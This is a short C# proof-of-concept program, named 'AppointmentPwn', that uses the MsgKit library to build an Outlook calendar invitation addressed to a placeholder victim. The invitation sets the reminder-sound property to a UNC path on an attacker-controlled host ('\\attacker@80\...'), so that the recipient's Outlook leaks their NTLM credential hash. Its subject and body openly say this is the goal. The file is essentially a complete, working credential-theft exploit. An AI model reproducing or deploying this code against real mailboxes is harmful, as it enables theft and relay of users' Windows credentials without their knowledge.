using MsgKit;
using MsgKit.Enums;
using System;

namespace AppointmentPwn
{
    internal class Program
    {
        static void Main()
        {
            using (var appointment = new Appointment(
                new Sender("istvan.toth@company.net", "Istvan Toth"),
                new Representing("istvan.toth@company.net", "Istvan Toth"),
                "Give me your hashes"))
            {
                appointment.Recipients.AddTo("victim@company.net", "John Victim");
                appointment.Subject = "Give me your hashes";
                appointment.MeetingStart = DateTime.Now.Date;
                appointment.MeetingEnd = DateTime.Now.Date.AddDays(1).Date;
                appointment.AllDay = true;
                appointment.BodyText = "Thank you for sending me your NTLM hash";
                appointment.BodyHtml = "<html><head></head><body><b>Thank you for sending me your NTLM hash</b></body></html>";
                appointment.SentOn = DateTime.UtcNow;
                appointment.Importance = MessageImportance.IMPORTANCE_NORMAL;
                appointment.IconIndex = MessageIconIndex.UnsentMail;
                appointment.PidLidReminderFileParameter = @"\\attacker@80\file\not\exists\sound.wav";
                appointment.PidLidReminderOverride = true;
                appointment.Save(@"outlook-pwn.msg");

                // Show the appointment
                // System.Diagnostics.Process.Start(@"outlook-pwn.msg");
            }
        }
    }
}
